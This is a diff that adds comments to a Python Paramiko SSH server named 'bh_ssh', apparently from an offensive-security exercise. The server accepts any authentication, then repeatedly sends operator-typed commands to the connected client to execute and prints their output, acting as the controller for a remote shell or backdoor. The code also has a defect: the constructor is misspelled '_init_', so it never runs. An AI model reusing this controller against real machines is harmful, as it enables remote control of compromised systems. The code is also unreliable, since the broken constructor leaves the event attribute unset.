@@ -4,10 +4,11 @@ import socket
 import sys
 import threading
 
+# Path to the hostkey
 CWD = os.path.dirname(os.path.realpath(__file__))
 HOSTKEY = paramiko.RSAKey(filename=os.path.join(CWD, 'paramiko_demos/test_rsa.key'))
 
-
+# Paramiko's ServerInterface implementation
 class Server (paramiko.ServerInterface):
     def _init_(self):
         self.event = threading.Event()
@@ -21,10 +22,12 @@ class Server (paramiko.ServerInterface):
         return paramiko.AUTH_SUCCESSFUL
 
 if __name__ == '__main__':
+    # IP and port of the server (change this)
     server = '192.168.100.87'
     ssh_port = 2222
 
     try:
+        # Create and configure socket
         sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
         sock.bind((server, ssh_port))
@@ -37,10 +40,13 @@ if __name__ == '__main__':
     else:
         print('[+] Got a connection!', client, addr)
 
+    # Create a Transport that attaches to the client
     session = paramiko.Transport(client)
+    # Set the server key and start the server
     session.add_server_key(HOSTKEY)
     session.start_server(server=Server())
-
+    
+    # Get the next channel opened by the client 
     channel = session.accept(20)
 
     if channel is None:
@@ -52,6 +58,9 @@ if __name__ == '__main__':
     channel.send('Welcome to bh_ssh')
 
     try:
+        # As long as the 'exit' command is not entered,
+        # send commands to be executed in the client and
+        # print the output
         while True:
             command = input('Enter command: ')
             
